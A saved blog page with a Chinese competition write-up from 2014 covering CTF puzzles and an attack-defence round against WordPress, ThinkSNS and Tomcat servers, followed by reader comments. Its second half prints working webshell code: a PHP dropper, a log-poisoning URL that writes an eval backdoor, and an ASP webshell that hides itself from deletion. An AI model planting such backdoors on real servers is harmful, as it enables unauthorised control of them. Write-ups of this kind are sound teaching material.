@@ -1,0 +1,651 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./360全国大学生信安技术大赛记录  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./360全国大学生信安技术大赛记录  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./360全国大学生信安技术大赛记录  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>360全国大学生信安技术大赛记录 | 离别歌</title>
+<link href="./360全国大学生信安技术大赛记录  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./360全国大学生信安技术大赛记录  离别歌/styles.css" rel="stylesheet"/>
+<link href="./360全国大学生信安技术大赛记录  离别歌/style.css" rel="stylesheet"/>
+<link href="./360全国大学生信安技术大赛记录  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./360全国大学生信安技术大赛记录  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./360全国大学生信安技术大赛记录  离别歌/jquery.min.js"></script>
+<link href="./360全国大学生信安技术大赛记录  离别歌/code.css" rel="stylesheet"/>
+<link href="./360全国大学生信安技术大赛记录  离别歌/button.css" rel="stylesheet"/>
+<link href="./360全国大学生信安技术大赛记录  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./360全国大学生信安技术大赛记录  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/360-ctf-writeup.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/360-ctf-writeup.html&amp;text=360%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B%E8%AE%B0%E5%BD%95"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/360-ctf-writeup.html&amp;title=360%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B%E8%AE%B0%E5%BD%95"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/360-ctf-writeup.html&amp;is_video=false&amp;description=360%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B%E8%AE%B0%E5%BD%95"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=360%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B%E8%AE%B0%E5%BD%95&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/360-ctf-writeup.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/360-ctf-writeup.html&amp;title=360%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B%E8%AE%B0%E5%BD%95"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/360-ctf-writeup.html&amp;title=360%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B%E8%AE%B0%E5%BD%95"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/360-ctf-writeup.html&amp;title=360%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B%E8%AE%B0%E5%BD%95"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/360-ctf-writeup.html&amp;title=360%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B%E8%AE%B0%E5%BD%95"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/360-ctf-writeup.html&amp;name=360%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B%E8%AE%B0%E5%BD%95&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">360全国大学生信安技术大赛记录</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年5月26日 22:25" itemprop="datePublished">
+                    2014 五月 26 22:25
+                </time>
+</div>
+<div class="article-tag">
+            阅读：11120
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/writeup">writeup</a>,
+                
+                <a class="tag-link" href="/tag/ctf">ctf</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+<span style="font-size:14px;">    大赛进行了两天，大起大落有，丧失信心也有，但最后还是挺过来了。多亏了给力的队友，blink和test，最后拿到了西北赛区的第二名。</span>
+</p>
+<p>
+<span style="font-size:14px;">    简单叙述一下整个过程吧，顺便记录一下平时没有注意的一些点。</span>
+</p>
+<p>
+<span style="font-size:14px;">    第一天的比赛是CTF类型的，实话说我不擅长这种类型的比赛，比赛经验不足，各种东西都快走到最后一步了但却不成功。第一道题js解密的就验证了这一点。这题的js代码是这样：</span>
+</p>
+<pre class="brush: js;auto-links: false;">var qrivy = eval;NanylmrgurXrl="7D6A792B606E723629383D3B2B586A6D6E7F722B4864657F6E787F2B62782B4D7E6565722A296D7E65687F6264652B48636E68605B6A78782322707D6A792B6469615B6A7878366F64687E666E657F256C6E7F4E676E666E657F4972426F23297B6A787829227D6A792B7B6A7878366469615B6A7878257D6A677E6E2B626D2329606E722920606E7225787E69787F7962656C233B27382236367B6A787822706A676E797F2329606E722B62782B62652B7B6A787829222B766E67786E706A676E797F23295F79722B6A6C6A62652A29222B7676";
+ArrqrqSha="function Xrlzrgubq(){qnauhnatcnv=Math.PI;cnefrVag=parseInt;sov='length';jebat0=cnefrVag(~((qnauhnatcnv&amp;qnauhnatcnv)|(~qnauhnatcnv&amp;qnauhnatcnv)&amp;(qnauhnatcnv&amp;~qnauhnatcnv)|(~qnauhnatcnv&amp;~qnauhnatcnv)));lhn3afh=cnefrVag(((jebat0&amp;jebat0)|(~jebat0&amp;jebat0)&amp;(jebat0&amp;~jebat0)|(~jebat0&amp;~jebat0))&amp;1);/*Where is the key?! rot13 is the key.*/rknz6znbm=lhn3afh&lt;&lt;lhn3afh;erf0hygVfabg=jebat0;LbhT0gvg='';jvxvqrp0qr=eval(unescape('%5'+'3%74%'+'72%69%6'+'E%67%2E%'+'66%72%'+'6F%6D%4'+'3%68%61'+'%72%4'+'3%6F'+'%64%65'));nccy2vf=qrivy;for(c3ffc0eg=jebat0;c3ffc0eg&lt;ArrqrqSha[sov];c3ffc0eg-=-lhn3afh)erf0hygVfabg+=ArrqrqSha.charCodeAt(c3ffc0eg);erf0hygVfabg%=unescape(jebat0+unescape('x')+(1&lt;&lt;6));for(c3ffc0eg=jebat0;c3ffc0eg&lt;NanylmrgurXrl[sov];c3ffc0eg+=rknz6znbm)LbhT0gvg+=jvxvqrp0qr(cnefrVag(jebat0+unescape('x')+NanylmrgurXrl.charAt(c3ffc0eg)+NanylmrgurXrl.charAt(c3ffc0eg+cnefrVag(lhn3afh)))^erf0hygVfabg);nccy2vf(LbhT0gvg);}"</pre>
+<span style="font-size:14px;">    这种javascript我不怕，感觉就是那样跟。首先ArrqrqSha是一个字符串，但这个字符串内容是个函数，我就把这个函数提取出来美化（</span><a href="http://tool.p1ng.pw/jstool.html" target="_blank"><span style="font-size:14px;">http://tool.p1ng.pw/jstool.html</span></a><span style="font-size:14px;">）一下：</span>
+<pre class="brush: js;auto-links: false;">function Xrlzrgubq() {
+	qnauhnatcnv = Math.PI;
+	cnefrVag = parseInt;
+	sov = 'length';
+	jebat0 = cnefrVag(~ ((qnauhnatcnv &amp; qnauhnatcnv) | (~qnauhnatcnv &amp; qnauhnatcnv) &amp; (qnauhnatcnv &amp; ~qnauhnatcnv) | (~qnauhnatcnv &amp; ~qnauhnatcnv)));
+	lhn3afh = cnefrVag(((jebat0 &amp; jebat0) | (~jebat0 &amp; jebat0) &amp; (jebat0 &amp; ~jebat0) | (~jebat0 &amp; ~jebat0)) &amp; 1); /*Where is the key?! rot13 is the key.*/
+	rknz6znbm = lhn3afh &lt;&lt; lhn3afh;
+	erf0hygVfabg = jebat0;
+	LbhT0gvg = '';
+	jvxvqrp0qr = eval(unescape('%5' + '3%74%' + '72%69%6' + 'E%67%2E%' + '66%72%' + '6F%6D%4' + '3%68%61' + '%72%4' + '3%6F' + '%64%65'));
+	nccy2vf = qrivy;
+	for (c3ffc0eg = jebat0; c3ffc0eg &lt; ArrqrqSha[sov]; c3ffc0eg -= -lhn3afh) erf0hygVfabg += ArrqrqSha.charCodeAt(c3ffc0eg);
+	erf0hygVfabg %= unescape(jebat0 + unescape('x') + (1 &lt;&lt; 6));
+	for (c3ffc0eg = jebat0; c3ffc0eg &lt; NanylmrgurXrl[sov]; c3ffc0eg += rknz6znbm) LbhT0gvg += jvxvqrp0qr(cnefrVag(jebat0 + unescape('x') + NanylmrgurXrl.charAt(c3ffc0eg) + NanylmrgurXrl.charAt(c3ffc0eg + cnefrVag(lhn3afh))) ^ erf0hygVfabg);
+	nccy2vf(LbhT0gvg);
+}</pre>
+<span style="font-size:14px;">    把这个函数放在原先那个js后面，然后Xrlzrgubq();调用。放浏览器中调试，可以看到报错信息：</span>
+<p>
+<br>
+</br></p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201405/a0171401115034.jpg" id="ematt:534" target="_blank"><img alt="001.jpg" border="0" height="206" src="./360全国大学生信安技术大赛记录  离别歌/thum-a0171401115034.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+<span style="font-size:14px;">    既然在这里报错，那么我在nccy2vf(LbhT0gvg);处下个断点，看看这两个变量的值是什么：</span>
+</p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201405/11f51401115265.jpg" id="ematt:536" target="_blank"><img alt="002.jpg" border="0" height="172" src="./360全国大学生信安技术大赛记录  离别歌/thum-11f51401115265.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+<span style="font-size:14px;">    断下来之后，居然LbhT0gvg变量是一个长得很像KEY的字符串。于是我在控制台里把它输出来，我估计它就是key了：</span>
+</p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201405/9c3c1401115370.jpg" id="ematt:538" target="_blank"><img alt="003.jpg" border="0" height="53" src="./360全国大学生信安技术大赛记录  离别歌/thum-9c3c1401115370.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+<span style="font-size:14px;">    这段代码啥意思就不太用解释了。我满以为自己找到key了。。。然后试了各种组合，key360、360key和rot_32过的字符串等等。。。全不对。到最后也没做出来。</span>
+</p>
+<p>
+<span style="font-size:14px;">    比赛完了我问基友，别人告诉我要把key360放在url里请求一下。。才会出来key。。</span>
+</p>
+<p>
+<span style="font-size:14px;">    这难道就是精神病人思路广吗？看来没有比赛经验，做题也很困难。</span>
+</p>
+<p>
+<span style="font-size:14px;">    不过两个给力的逆向大牛把开出来的逆向题都做了，以至于我们队伍的分数还不低。web题也很坑，第二道是让我们找dede的后台（什么dede，就是ctrl+s保存的一个静态页面，毫无实战意义），dede找后台的方法就那么几个，我下载了.inc文件。但inc文件太大，内容太多，我没仔细找，以至于到最后才在不起眼的角落里找到。（通过搜索login应该能很容易找到的，但是之前没想到）</span>
+</p>
+<p>
+<span style="font-size:14px;">    第三道web题是任意文件读取，读到.htaccess是类似 ^bob rewrite.php，将bob开头的请求转到rewrite.php中，前面还检查了referer，不过不知道为何我之后试的一直不成功。因为我当时就读rewrite.php，但里面啥都没有，所以我就没多想。还是想吐槽一下360，真的毫无实战价值，既然你将^bob请求转到rewrite.php里，那rewrite.php里就应该有东西啊，结果读出来就一个echo。最后答案却在bob.php里，我请求http://xxx/bob.php的时候应该被转向到rewrite.php里了才对呀？这种毫无实战价值的题目，真想不到你们的工程师是怎么想到的。真垃圾。</span>
+</p>
+<p>
+<span style="font-size:14px;">    最后发现，最简单的其实还是加密解密的题目，40分的是一堆01，二进制的字符串，感觉是一个图片，拿前几位去解密发现是PK开头。看到PK开头我就知道是zip文件了，然后把字符串保存下来写了个脚本转换成二进制数据。后缀改成zip，解压得到一张图片，notepad打开图片找到一串base64字符串，解两次得到最终key。</span>
+</p>
+<p>
+<span style="font-size:14px;">    80分的题是一道古典密码题目，给了一个人的头像，求某串密文对应的明文：</span>
+</p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201405/c0501401116468.jpg" id="ematt:540" target="_blank"><img alt="004.jpg" border="0" height="281" src="./360全国大学生信安技术大赛记录  离别歌/thum-c0501401116468.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+<span style="font-size:14px;">    上谷歌图片搜索搜到的是</span><span style="white-space:normal;"><span style="font-size:14px;">维吉尼亚什么的，得知是</span><span style="white-space:normal;font-size:14px;">维吉尼亚密码。题目中给了两个明文和密文、密钥的对照，而我知道维吉尼亚密码是通过密码表维系的关系（题目告诉我们它改了改，那肯定就修改的是密码表了）</span></span><span style="font-size:14px;">，所以我们可以通过已知的对照组解出部分密码表，通过密码表来计算最后的key。不过最后没时间做了，这题也没做出来。</span>
+</p>
+<p>
+<span style="font-size:14px;">    其他题都是队友做的了。。我基本酱油了一天，搞的最后都没信心了。但队友还是很厉害地拿到了西北赛区的并列第一，也还好给我点鼓励。</span>
+</p>
+<p>
+<br>
+</br></p>
+<p>
+<span style="font-size:14px;">    第二天的比赛是纯实战的，队里就我一个做web的，还没有人做渗透。我一个程序员，不太会渗透，但硬着头也得上了。</span>
+</p>
+<p>
+<span style="font-size:14px;">    第一题是一个wordpress，还是感觉自己准备不足，居然手里没有好用的wpscan，kali里那个不好用。就先放着了。第三个服务器有两个站，discuz和thinksns，discuz3.0没戏，我就乌云上翻了翻thinksns，因为之前几个搞代码审计的审计了好些thinksns、thinksaas、记事狗这类的cms，所以还算比较熟悉。用了一个任意文件包含（</span><a href="http://www.wooyun.org/bugs/wooyun-2013-043945" target="_blank"><span style="font-size:14px;">http://www.wooyun.org/bugs/wooyun-2013-043945</span></a><span style="font-size:14px;">），注册个号发微博上传图片，能phpinfo。</span>
+</p>
+<p>
+<span style="font-size:14px;">    不过传了个一句话发现菜刀连不上，估计是被防火墙拦了。传大马能包含，但包含了执行出问题，估计是因为包含进去的大马变量受限制了。后来写了个脚本，在根目录生成了个大马：</span>
+</p>
+<pre class="brush: php;auto-links: false;">&lt;?php
+file_put_contents('hehe.php', file_get_contents('刚才传上来的大马地址'));
+?&gt;</pre>
+<p>
+<span style="font-size:14px;">    然后拿下了shell。能执行命令，不过linux 2.6.18 64位，之前弹shell一直弹不了（被拦了，直接跳到360），我们又没有外网地址，只能用我一台windows vps做弹shell的服务器，metasploit也用不了。下午用习科大马里自带的弹shell功能弹了一个shell，但用了各种提权程序没成功，估计是因为64位的，我不太会。</span>
+</p>
+<p>
+<span style="font-size:14px;">    文件包含的洞补了以后就把这台服务器忘了（居然没想到多补几个，另一个地方还有任意文件上传）。第4台是一个dvbbs，不过我对asp和windows不太熟，然后没合适的路径扫描器（扫描器一扫就502，根本没法用），没扫到eweb。</span>
+</p>
+<p>
+<span style="font-size:14px;">    回到第一个wordpress，用wvs一爬发现有插件的任意文件包含。当时把我乐坏了，不过后来发现根本没地方可以上传文件，所以也没什么文件能包含。nginx日志没找到（找到了人说太大，没法包含，有无数人拿扫描器扫，导致日志太大</span><span style="font-size:14px;">），env环境变量网上说可以控制，我也没成功，shadow下下来没密码（有也破不出</span><span style="font-size:14px;">）。</span>
+</p>
+<p>
+<span style="font-size:14px;">    当时就绝望了。不过这台服务器上有个tomcat，我就开始翻tomcat文件。一个docs、一个exmaple，没啥线索，后台也找不着。然后神队友看到了wp一篇文章里有个url http://localhost:8080/qihoo，我当时看到了没在意，结果居然qihoo也是tomcat下一个目录。</span>
+</p>
+<p>
+<span style="font-size:14px;">    qihoo里一个文件，找到一个任意文件下载。这里犯了一个致命的错误，我下载了/etc/passwd，里面没密码。实际上有密码的是/etc/shadow，我却没有下。看来还是平时实战经验太少了，导致犯了这种错误。如果拿到密码，跑出来的话，就又能多100分了。</span>
+</p>
+<p>
+<span style="font-size:14px;">    通过这个任意文件下载，我下到了wp的config文件，数据库root权限不能外连，root密码也不是ssh密码。我之前一直以为wp的cookie和emlog一样，仅仅通过config.php文件中的auth来确定。我就在本地搭建了一个wp，把配置文件复制过来，结果拿到的cookie还是不能用。后来读代码发现cookie还跟用户密码的部分有关系，伪造也不行了。</span>
+</p>
+<p>
+<span style="font-size:14px;">    回到wp，知道了数据库是root后，我后来想找一个有注入的插件，能写个shell到网站目录下。或写到tmp目录，通过那个任意文件包含拿shell。但扫描器扫插件，扫10个有5个502，根本没法扫。只能一个一个手工试。在我试的时候，让神队友blink找找tomcat日志，结果还真被他找到了。</span>
+</p>
+<p>
+<span style="font-size:14px;">    地址是</span><span style="font-size:14px;">/usr/local/tomcat7/logs/localhost_access_log.2014-05-25.txt。日志下载下来只有40多M，应该可以包含的。但包含的时候发现似乎显示不完。我当时想显示不完不代表包含不完，于是我写了一个写shell的脚本，放在url后面访问了一下tomcat（浏览器会把空格等字符url 编码，得抓包把他们改回来</span><span style="font-size:14px;">）：</span>
+</p>
+<pre class="brush: php;auto-links: false;">http://xxx:8080/?&lt;?php file_put_content('1.php','&lt;?php eval($_POST[a]);?&gt;');?&gt;</pre>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">包含以后果然写了一个shell 1.php。菜刀成功连上。</span>
+<p>
+<br/>
+</p>
+<p>
+<span style="font-size:14px;">    shell拿到以后我发现有人删shell，不过还好我机智无比，比赛前一天晚上我就写了几个脚本，防删shell用的。</span>
+</p>
+<p>
+<span style="font-size:14px;">    （被XX和谐）<br/>
+</span>
+</p>
+    <span style="font-size:14px;">这个脚本会常驻内存中，除非你重启服务器，否则它会每隔50毫秒检查一下自身（或xx.php）是否存在，不存在就把原内容再写进去，达到防删效果。</span><br/>
+<p>
+<br/>
+</p>
+<p>
+<span style="font-size:14px;">    再来个asp的： </span>
+</p>
+<pre class="brush: vb;auto-links: false;">&lt;%
+dim file_name
+file_name = Server.MapPath("./") &amp; Replace(Request.ServerVariables("Script_Name"),"/","\")
+set fso = createobject("scripting.filesystemobject")
+set file = fso.getfile(file_name)
+file.attributes = 1+2+4
+
+if Request("never") &lt;&gt; empty then 
+	eval Request("never")
+end if
+%&gt;</pre>
+    <span style="font-size:14px;">这个是将文件属性设置成系统+隐藏+只读，在菜刀里就删不掉了。除非你把属性再改回来。</span><br/>
+<p>
+<br/>
+</p>
+<p>
+<span style="font-size:14px;">    回到比赛，连上shell后修复几个漏洞，uname发现又是刚才那个内核，64位。。。还是提不下。不过翻tomcat目录找到了管理员密码和后台，登录进去部署一个war拿下shell。不过那个shell太恶心了，路径是\不是/（写shell的时候没考虑过linux吗，真的很坑），导致传文件传不了，修改文件修不了，命令执行不了。。。然后没时间了，我就没继续试了。否则tomcat估计直接是root权限，能拿到100分的。</span>
+</p>
+<p>
+<span style="font-size:14px;">    第二个服务器也是很遗憾的，首页一张图片，看源码有个ssh，一个日期（其实这个日期居然就是这台服务器的root密码。。。但当时为啥没去试</span><span style="font-size:14px;">），图片是个图种，解压后一个pcap包，跑wpa的。。。结果队友跑了3个小时没出来。。。不知道为什么，可能是姿势不对，学弟3秒就跑出来了。。。就是那个日期。因为没跑出来，所以这个服务器一点没做，就丢了。</span>
+</p>
+<p>
+<span style="font-size:14px;">    第一天分数第一的队伍（坑学长）就是因为拿下了这个服务器获得了100分，最后抱得s4归，不过我居然觉得ipad mini比s4要好，哈哈。</span>
+</p>
+<p>
+<span style="font-size:14px;">    总体来说自己还是拖了队伍后腿，不过还好没有拖太狠。最后没拿下服务器，但修复漏洞也得了点分。帮助我很大的是我之前写的一个小工具集：<a href="http://tool.p1ng.pw/" target="_blank">http://tool.p1ng.pw/</a>，还有wooyun、wvs、谷歌，这也是实战中离不开的。<br/>
+</span>
+</p>
+<p>
+<br/>
+</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2052">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/c8e1e5dfbddb46fad203b16f5dcdfa62.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://blog.kfd.me" target="_blank">mr</a>
+<time datetime="2015年5月7日 15:52" itemprop="datePublished">
+                            2015 五月 07 15:52
+                        </time>
+<a href="javascript:reply_to('2052', 'mr')">回复</a>
+</p>
+<p class="comment-meta">没想到我竟然从谷歌来到了这里- -<br/>知道我搜的关键词是什么嘛？<br/>where is the key?! rot13 is the key 360<br/>也是醉了。。。</p>
+</div>
+</div>
+<div class="row" id="comment-2008">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/1969cf040f3c974e5ace1bedcc7b2989.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">玻镁板</a>
+<time datetime="2015年4月2日 16:53" itemprop="datePublished">
+                            2015 四月 02 16:53
+                        </time>
+<a href="javascript:reply_to('2008', '玻镁板')">回复</a>
+</p>
+<p class="comment-meta">好文章，内容惊心动魄.</p>
+</div>
+</div>
+<div class="row" id="comment-1927">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/c07547493e25b20d3f73252446009798.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.banshouseo.com/" target="_blank">站长工具</a>
+<time datetime="2015年1月27日 10:23" itemprop="datePublished">
+                            2015 一月 27 10:23
+                        </time>
+<a href="javascript:reply_to('1927', '站长工具')">回复</a>
+</p>
+<p class="comment-meta">大神，请收下我的膝盖</p>
+</div>
+</div>
+<div class="row" id="comment-1791">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/08a04f62601d9c32e77067c5ae6a5cf6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">求助</a>
+<time datetime="2014年10月8日 10:29" itemprop="datePublished">
+                            2014 十月 08 10:29
+                        </time>
+<a href="javascript:reply_to('1791', '求助')">回复</a>
+</p>
+<p class="comment-meta">大神你好，我想问一下那个2进制转16进制的脚本是怎么写的呀？可以发到我邮箱吗？谢谢啦！！</p>
+</div>
+</div>
+<div class="row" id="comment-1715">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/c121b4d6f8c3123601549cf537e7d50b.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://wood-tree.com" target="_blank">木树</a>
+<time datetime="2014年7月10日 05:07" itemprop="datePublished">
+                            2014 七月 10 05:07
+                        </time>
+<a href="javascript:reply_to('1715', '木树')">回复</a>
+</p>
+<p class="comment-meta">还真是术有专攻</p>
+</div>
+</div>
+<div class="row" id="comment-1691">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/300139c0b87bc95c2eb1496b4ae8b755.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">陆羽</a>
+<time datetime="2014年6月18日 04:50" itemprop="datePublished">
+                            2014 六月 18 04:50
+                        </time>
+<a href="javascript:reply_to('1691', '陆羽')">回复</a>
+</p>
+<p class="comment-meta">原来站长也参加了我们的比赛。呵呵。。。另外ssh那个root密码不是日期，后门密码才是</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1692">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年6月18日 07:09" itemprop="datePublished">
+                            2014 六月 18 07:09
+                        </time>
+<a href="javascript:reply_to('1692', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@陆羽：唉，技不如人，见笑。。。</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1796">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/1987dba5837cf5f294a8ba1540f417a2.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://forum.90sec.org/" target="_blank">linso</a>
+<time datetime="2014年10月11日 17:23" itemprop="datePublished">
+                            2014 十月 11 17:23
+                        </time>
+<a href="javascript:reply_to('1796', 'linso')">回复</a>
+</p>
+<p class="comment-meta">@phithon：呵呵。土司、360的陆羽也来了。吓尿了</p>
+</div>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1690">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./360全国大学生信安技术大赛记录  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.coffin5257.com" target="_blank">coffin</a>
+<time datetime="2014年6月14日 17:21" itemprop="datePublished">
+                            2014 六月 14 17:21
+                        </time>
+<a href="javascript:reply_to('1690', 'coffin')">回复</a>
+</p>
+<p class="comment-meta">那个WP的服务器……下午哪个队就一直在跟我们死磕- -<br/>到结束他们都快把WP后台删没了...</p>
+</div>
+</div>
+<div class="row" id="comment-1681">
+<div class="col-xs-2 col-sm-1 gravatar">
